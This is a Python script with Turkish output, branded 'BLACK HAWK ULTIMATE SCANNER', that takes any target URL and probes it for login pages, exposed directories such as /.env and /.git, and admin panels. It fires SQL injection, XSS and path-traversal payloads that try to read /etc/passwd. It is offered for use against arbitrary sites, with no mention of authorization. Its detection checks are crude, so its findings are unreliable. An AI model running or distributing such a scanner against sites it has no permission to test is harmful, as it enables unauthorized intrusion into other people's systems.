#!/usr/bin/env python3
"""
BLACK HAWK ULTIMATE SCANNER v1.0
Tek Script, Tüm Siteler İçin
Kullanım: python3 blackhawk.py https://hedef.com
"""

import requests
import sys
import re
from urllib.parse import urljoin

banner = """
\x1b[91m
   ▄▄▄▄    ██▓     ▄▄▄       ▄████▄   ██ ▄█▀  ██░ ██  ▄▄▄       ██░ ██ 
  ▓█████▄  ▓██▒    ▒████▄    ▒██▀ ▀█   ██▄█▒  ▓██░ ██ ▒████▄    ▓██░ ██ 
  ▒██▒ ▄██ ▒██░    ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░  ▒██▀▀██ ▒██  ▀█▄  ▒██▀▀██ 
  ▒██░█▀   ▒██░    ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄  ░▓█ ░██ ░██▄▄▄▄██ ░▓█ ░██ 
  ░▓█  ▀█▓ ░██████▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄ ░▓█▒░██▓ ▓█   ▓██▒░▓█▒░██ 
  ░▒▓███▀▒ ░ ▒░▓  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒  ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░▒░ 
  ▒░▒   ░  ░ ░ ▒  ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░  ▒ ░▒░ ░  ▒   ▒▒ ░ ▒ ░▒░ 
   ░    ░    ░ ░     ░   ▒   ░        ░ ░░ ░   ░  ░░ ░  ░   ▒    ░  ░░ 
   ░           ░  ░      ░  ░░ ░      ░  ░     ░  ░  ░      ░  ░ ░  ░ 
        ░                       ░                       
\x1b[0m
"""

class BlackHawk:
    def __init__(self, target):
        self.target = target
        self.s = requests.Session()
        self.s.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.s.timeout = 3
        self.bulunan = []
    
    def tarama(self):
        print(f"\n\x1b[93m[+] HEDEF TARANIYOR: {self.target}\x1b[0m\n")
        self.sayfa_kaynak_kontrol()
        self.login_bul()
        self.dizin_tara()
        self.sql_test()
        self.xss_test()
        self.lfi_test()
        self.admin_bul()
        self.rapor()
    
    def sayfa_kaynak_kontrol(self):
        print("\x1b[94m[>] Sayfa Kaynağı Taranıyor...\x1b[0m")
        try:
            r = self.s.get(self.target)
            icerik = r.text.lower()
            if "login" in icerik or "password" in icerik or "username" in icerik:
                self.bulunan.append(f"🔑 Login Formu Tespit Edildi")
                print("  \x1b[92m✓ Login formu bulundu.\x1b[0m")
            if "admin" in icerik or "administrator" in icerik:
                self.bulunan.append(f"🛡️ Admin İfadesi Bulundu")
            if "mysql" in icerik or "sql" in icerik:
                self.bulunan.append(f"🗄️ SQL İfadesi Tespit Edildi")
        except Exception as e:
            print(f"  \x1b[91mHata: {e}\x1b[0m")

    def login_bul(self):
        print("\x1b[94m[>] Login Sayfası Aranıyor...\x1b[0m")
        yollar = ["/login", "/login.php", "/login.jsp", "/admin", "/admin/login", "/signin", "/user/login"]
        for yol in yollar:
            try:
                url = urljoin(self.target, yol)
                r = self.s.get(url)
                if r.status_code == 200:
                    self.bulunan.append(f"🔐 Login Sayfası: {url}")
                    print(f"  \x1b[92m✓ {url}\x1b[0m")
            except:
                pass

    def dizin_tara(self):
        print("\x1b[94m[>] Dizin Taraması Yapılıyor...\x1b[0m")
        dizinler = ["/backup", "/tmp", "/admin", "/panel", "/cpanel", "/logs", "/config", "/.git", "/.env", "/phpmyadmin", "/pma", "/mysql"]
        for dizin in dizinler:
            try:
                url = urljoin(self.target, dizin)
                r = self.s.get(url)
                if r.status_code == 200:
                    self.bulunan.append(f"📂 Dizin: {url}")
                    print(f"  \x1b[92m✓ {url}\x1b[0m")
            except:
                pass

    def sql_test(self):
        print("\x1b[94m[>] SQL Enjeksiyon Testi...\x1b[0m")
        payload = "' OR '1'='1"
        parametreler = ["id", "page", "user", "cat", "product", "q", "search"]
        for param in parametreler:
            try:
                url = f"{self.target}?{param}={payload}"
                r = self.s.get(url)
                if "sql" in r.text.lower() or "mysql" in r.text.lower() or "error" in r.text.lower():
                    self.bulunan.append(f"💉 SQL ZAFİYETİ: {url}")
                    print(f"  \x1b[91m⚠ SQL Zafiyeti Bulundu! {url}\x1b[0m")
                    break
            except:
                pass

    def xss_test(self):
        print("\x1b[94m[>] XSS Testi...\x1b[0m")
        payload = "<script>alert('XSS')</script>"
        parametreler = ["q", "search", "id", "page"]
        for param in parametreler:
            try:
                url = f"{self.target}?{param}={payload}"
                r = self.s.get(url)
                if payload in r.text:
                    self.bulunan.append(f"⚠ XSS ZAFİYETİ: {url}")
                    print(f"  \x1b[91m⚠ XSS Zafiyeti Bulundu! {url}\x1b[0m")
                    break
            except:
                pass

    def lfi_test(self):
        print("\x1b[94m[>] LFI Testi...\x1b[0m")
        payload = "../../../../etc/passwd"
        parametreler = ["file", "page", "path", "doc"]
        for param in parametreler:
            try:
                url = f"{self.target}?{param}={payload}"
                r = self.s.get(url)
                if "root:" in r.text:
                    self.bulunan.append(f"📄 LFI ZAFİYETİ: {url}")
                    print(f"  \x1b[91m⚠ LFI Zafiyeti Bulundu! {url}\x1b[0m")
                    break
            except:
                pass

    def admin_bul(self):
        print("\x1b[94m[>] Admin Paneli Aranıyor...\x1b[0m")
        yollar = ["/admin", "/administrator", "/panel", "/cpanel", "/dashboard", "/wp-admin"]
        for yol in yollar:
            try:
                url = urljoin(self.target, yol)
                r = self.s.get(url)
                if r.status_code == 200:
                    self.bulunan.append(f"🛡️ Admin Paneli: {url}")
                    print(f"  \x1b[92m✓ {url}\x1b[0m")
            except:
                pass

    def rapor(self):
        print("\n\x1b[96m═══════════════════════════════════════\x1b[0m")
        print("\x1b[92m[+] TARAMA TAMAMLANDI\x1b[0m")
        print("\x1b[96m═══════════════════════════════════════\x1b[0m")
        
        if self.bulunan:
            print("\n\x1b[93m[!] BULGULAR:\x1b[0m")
            for i, bulgu in enumerate(self.bulunan, 1):
                print(f"  {i}. {bulgu}")
        else:
            print("\n\x1b[91m[-] Güvenlik Duvarı (WAF) Arkasında Olabilir veya Zafiyet Yok.\x1b[0m")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python3 blackhawk.py https://hedef.com")
        print("Örnek: python3 blackhawk.py https://example.com")
        sys.exit(1)
    
    print(banner)
    scanner = BlackHawk(sys.argv[1])
    scanner.tarama()
